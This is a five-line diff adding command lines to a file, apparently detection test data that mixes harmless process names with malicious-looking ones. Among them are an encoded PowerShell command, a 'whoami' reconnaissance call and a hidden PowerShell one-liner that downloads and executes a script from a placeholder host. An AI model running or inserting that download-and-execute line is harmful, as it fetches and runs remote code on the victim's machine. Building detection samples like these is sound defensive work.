@@ -1,0 +1,5 @@
+powershell -enc SQBFAFgA
+notepad.exe
+cmd /c whoami
+powershell -nop -w hidden -c iex(new-object system.net.webclient).downloadstring('http://bad')
+explorer.exe
